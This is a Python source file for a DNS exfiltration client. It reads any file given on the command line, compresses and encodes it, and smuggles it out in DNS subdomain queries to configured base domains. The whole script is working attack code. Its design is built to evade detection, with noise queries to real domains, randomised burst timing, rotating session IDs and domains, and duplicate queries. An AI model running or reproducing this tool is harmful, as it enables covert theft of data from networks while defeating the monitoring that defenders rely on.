#!/usr/bin/env python3
"""DNS Exfiltration - Client (Sender)

Exfiltrates a file by encoding its data into DNS subdomain queries.
Uses the system's DNS resolver so traffic flows through normal DNS
infrastructure, indistinguishable from regular browsing.

Anti-detection features:
- Gzip compression (60-80% fewer queries)
- Low-entropy encoding (hex-split or wordlist)
- Sequence numbers XORed and embedded in data (no visible pattern)
- Session ID rotation every N bursts (defeats correlation)
- Domain rotation across multiple base domains
- Poisson-distributed burst-silence timing
- Noise queries to real popular domains with cache-hit simulation
- Weighted query type distribution (A/AAAA/CNAME)
- Duplicate query injection to reduce unique ratio
"""

import gzip
import hashlib
import os
import random
import secrets
import sys
import time

import dns.resolver

from config import (
    BASE_DOMAINS,
    BURST_SIZE_MAX,
    BURST_SIZE_MIN,
    CACHE_HIT_DOMAINS,
    CACHE_REPEAT_RATE,
    COMPRESS_DATA,
    DUPLICATE_QUERY_RATE,
    ENCODING_STRATEGY,
    HASH_ALGORITHM,
    HEX_LABEL_LENGTH,
    INTER_BURST_DELAY_MAX,
    INTER_BURST_DELAY_MEAN,
    INTER_BURST_DELAY_MIN,
    INTRA_BURST_DELAY,
    LABELS_PER_QUERY,
    METADATA_PREFIX,
    NOISE_DOMAINS_FILE,
    NOISE_RATIO,
    QUERY_TYPE_WEIGHTS,
    SESSION_ID_LENGTH,
    SESSION_KEY_LENGTH,
    SESSION_ROTATE_INTERVAL,
)
from encoding import embed_sequence, encode_hex_split, encode_wordlist


def load_noise_domains():
    """Load popular domains for noise queries."""
    with open(NOISE_DOMAINS_FILE) as f:
        return [line.strip() for line in f if line.strip()]


def compute_hash(data):
    """Compute file hash for integrity verification."""
    hasher = hashlib.new(HASH_ALGORITHM)
    hasher.update(data)
    return hasher.hexdigest()


def weighted_query_type():
    """Pick a DNS query type based on realistic weight distribution."""
    types = list(QUERY_TYPE_WEIGHTS.keys())
    weights = list(QUERY_TYPE_WEIGHTS.values())
    return random.choices(types, weights=weights, k=1)[0]


def encode_data(data):
    """Encode raw bytes into DNS labels using configured strategy."""
    if ENCODING_STRATEGY == "hex_split":
        return encode_hex_split(data, label_len=HEX_LABEL_LENGTH)
    elif ENCODING_STRATEGY == "wordlist":
        return encode_wordlist(data)
    else:
        raise ValueError(f"Unknown encoding strategy: {ENCODING_STRATEGY}")


def chunk_data(data, labels_per_query=LABELS_PER_QUERY):
    """Split data into chunks sized for the encoding strategy.

    Accounts for 2-byte sequence number that will be prepended to each chunk.
    """
    if ENCODING_STRATEGY == "hex_split":
        avg_prefix_len = 3
        hex_per_label = HEX_LABEL_LENGTH - avg_prefix_len
        bytes_per_label = hex_per_label // 2
        chunk_size = bytes_per_label * labels_per_query - 2  # reserve 2 for seq
    else:
        chunk_size = labels_per_query - 2  # reserve 2 labels for seq bytes

    chunk_size = max(chunk_size, 1)
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def build_query_name(data_labels, session_id, base_domain):
    """Build a DNS query name from components.

    Format: <data_labels>.<session_id>.<base_domain>
    Sequence number is already embedded in the data labels.
    """
    parts = data_labels + [session_id, base_domain]
    return ".".join(parts)


def resolve_query(qname, qtype="A"):
    """Send a DNS query through the system resolver."""
    try:
        dns.resolver.resolve(qname, qtype, lifetime=5)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.resolver.NoNameservers, dns.resolver.LifetimeTimeout,
            dns.exception.DNSException):
        pass


def resolve_noise(domain, qtype=None):
    """Send a noise query to a real popular domain."""
    if qtype is None:
        qtype = weighted_query_type()
    resolve_query(domain, qtype)


def inter_burst_delay():
    """Generate Poisson-distributed inter-burst delay.

    Uses exponential distribution (inter-arrival time of Poisson process)
    clamped to [min, max] range for realism.
    """
    delay = random.expovariate(1.0 / INTER_BURST_DELAY_MEAN)
    return max(INTER_BURST_DELAY_MIN, min(delay, INTER_BURST_DELAY_MAX))


class SessionManager:
    """Manages rotating session IDs with chaining for server correlation."""

    def __init__(self):
        self.session_key = secrets.token_bytes(SESSION_KEY_LENGTH)
        self.current_id = secrets.token_hex(SESSION_ID_LENGTH // 2)
        self.burst_count = 0
        self.previous_ids = []

    def get_session_id(self):
        return self.current_id

    def get_session_key(self):
        return self.session_key

    def maybe_rotate(self):
        """Rotate session ID every N bursts.

        The new session ID encodes a chain token so the server
        can link sessions together.
        """
        self.burst_count += 1
        if self.burst_count >= SESSION_ROTATE_INTERVAL:
            self.previous_ids.append(self.current_id)
            # New session ID is derived from key + old ID (server can verify)
            chain = hashlib.sha256(
                self.session_key + self.current_id.encode()
            ).hexdigest()[:SESSION_ID_LENGTH]
            self.current_id = chain
            self.burst_count = 0
            return True
        return False

    def get_chain_announcement(self, base_domain):
        """Build a special query announcing a session rotation.

        Format: <old_id>.<new_id>.<chain_marker>.<base_domain>
        The chain_marker 'r' tells the server this is a rotation announcement.
        """
        if not self.previous_ids:
            return None
        old_id = self.previous_ids[-1]
        labels = encode_data(old_id.encode())
        return build_query_name(labels, "r" + self.current_id, base_domain)


class DomainRotator:
    """Rotates through multiple base domains to distribute queries."""

    def __init__(self, domains):
        self.domains = domains
        self.index = 0

    def next(self):
        domain = self.domains[self.index % len(self.domains)]
        self.index += 1
        return domain

    def current(self):
        return self.domains[self.index % len(self.domains)]


def send_file(filepath):
    """Exfiltrate a file over DNS queries with full anti-detection.

    Protocol:
        1. Generate session ID and key
        2. Read file, compress, compute hash, split into chunks
        3. Embed XORed sequence numbers into each chunk
        4. Send metadata query (seq 0): chunk_count||hash||compressed_flag
        5. Send data queries with embedded sequence numbers
        6. Rotate session IDs and base domains periodically
        7. Mix with noise queries in Poisson burst-silence pattern
        8. Inject duplicate and cache-hit queries
    """
    with open(filepath, "rb") as f:
        file_data = f.read()

    file_hash = compute_hash(file_data)

    # Compress if beneficial
    compressed = False
    if COMPRESS_DATA:
        compressed_data = gzip.compress(file_data, compresslevel=9)
        if len(compressed_data) < len(file_data):
            send_data = compressed_data
            compressed = True
        else:
            send_data = file_data
    else:
        send_data = file_data

    chunks = chunk_data(send_data)
    session_mgr = SessionManager()
    domain_rotator = DomainRotator(BASE_DOMAINS)
    noise_domains = load_noise_domains()

    # Select a subset of noise domains as "frequently visited" for cache simulation
    cache_favorites = random.sample(
        noise_domains, min(CACHE_HIT_DOMAINS, len(noise_domains))
    )

    compression_pct = (
        f" (compressed {100 - len(send_data) * 100 // len(file_data)}%)"
        if compressed else ""
    )
    print(f"File: {filepath}")
    print(f"Size: {len(file_data)} bytes -> {len(send_data)} bytes{compression_pct}")
    print(f"Chunks: {len(chunks)}")
    print(f"Session: {session_mgr.get_session_id()}")
    print(f"Domains: {len(BASE_DOMAINS)}")
    print(f"Encoding: {ENCODING_STRATEGY}")
    print()

    # --- Send metadata first ---
    metadata_str = f"{len(chunks)}||{file_hash}||{'1' if compressed else '0'}"
    meta_with_seq = embed_sequence(
        metadata_str.encode(), 0, session_mgr.get_session_key()
    )
    meta_labels = encode_data(meta_with_seq)
    meta_labels[0] = METADATA_PREFIX + meta_labels[0]
    base_domain = domain_rotator.next()
    meta_qname = build_query_name(
        meta_labels, session_mgr.get_session_id(), base_domain
    )

    print("[META] Sending metadata...")
    resolve_query(meta_qname, weighted_query_type())

    # Noise after metadata
    for _ in range(random.randint(3, 7)):
        resolve_noise(random.choice(noise_domains))
        time.sleep(random.uniform(*INTRA_BURST_DELAY))

    time.sleep(inter_burst_delay())

    # --- Prepare data queries ---
    # Pre-encode all chunks with embedded sequence numbers
    encoded_queries = []
    for orig_seq, chunk in enumerate(chunks, start=1):
        chunk_with_seq = embed_sequence(
            chunk, orig_seq, session_mgr.get_session_key()
        )
        labels = encode_data(chunk_with_seq)
        encoded_queries.append(labels)

    # Shuffle delivery order (sequence is embedded, so order doesn't matter)
    delivery_order = list(range(len(encoded_queries)))
    random.shuffle(delivery_order)

    sent_qnames = []
    total_sent = 0
    total_data = len(encoded_queries)

    # --- Send in Poisson burst-silence pattern ---
    order_idx = 0
    while order_idx < len(delivery_order):
        burst_size = random.randint(BURST_SIZE_MIN, BURST_SIZE_MAX)

        burst = []

        # Data queries for this burst (1-3 data per burst)
        data_in_burst = min(random.randint(1, 3), len(delivery_order) - order_idx)
        for _ in range(data_in_burst):
            chunk_idx = delivery_order[order_idx]
            labels = encoded_queries[chunk_idx]
            base_domain = domain_rotator.next()
            qname = build_query_name(
                labels, session_mgr.get_session_id(), base_domain
            )
            burst.append(("data", qname))
            sent_qnames.append(qname)
            order_idx += 1
            total_sent += 1

        # Maybe inject a duplicate of a previous query
        if sent_qnames and random.random() < DUPLICATE_QUERY_RATE:
            dup = random.choice(sent_qnames)
            burst.append(("dup", dup))

        # Fill rest of burst with noise (maintain NOISE_RATIO)
        noise_count = max(burst_size - len(burst), data_in_burst * NOISE_RATIO)
        for _ in range(noise_count):
            # Mix regular noise with cache-hit simulation
            if random.random() < CACHE_REPEAT_RATE:
                domain = random.choice(cache_favorites)
            else:
                domain = random.choice(noise_domains)
            burst.append(("noise", domain))

        # Shuffle so data queries are randomly positioned within burst
        random.shuffle(burst)

        # Send burst
        for query_type, qname in burst:
            qtype = weighted_query_type()
            resolve_query(qname, qtype)

            if query_type == "data":
                print(
                    f"\r  [{total_sent}/{total_data}] Sending chunks...",
                    end="", flush=True,
                )

            time.sleep(random.uniform(*INTRA_BURST_DELAY))

        # Rotate session if needed
        if session_mgr.maybe_rotate():
            # Send a rotation announcement so the server can link sessions
            base_domain = domain_rotator.next()
            chain_qname = session_mgr.get_chain_announcement(base_domain)
            if chain_qname:
                resolve_query(chain_qname, "A")

        # Poisson inter-burst pause
        time.sleep(inter_burst_delay())

    print(f"\n\nTransfer complete.")
    print(f"  Data queries: {total_data}")
    print(f"  Session rotations: {len(session_mgr.previous_ids)}")


def main():
    if len(sys.argv) > 1:
        filepath = sys.argv[1]
    else:
        filepath = input("Enter file path to exfiltrate: ").strip()

    if not filepath:
        print("Error: File path cannot be empty.")
        sys.exit(1)

    if not os.path.isfile(filepath):
        print(f"Error: File '{filepath}' not found.")
        sys.exit(1)

    try:
        send_file(filepath)
    except PermissionError:
        print("Error: Permission denied reading file.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(0)


if __name__ == "__main__":
    main()
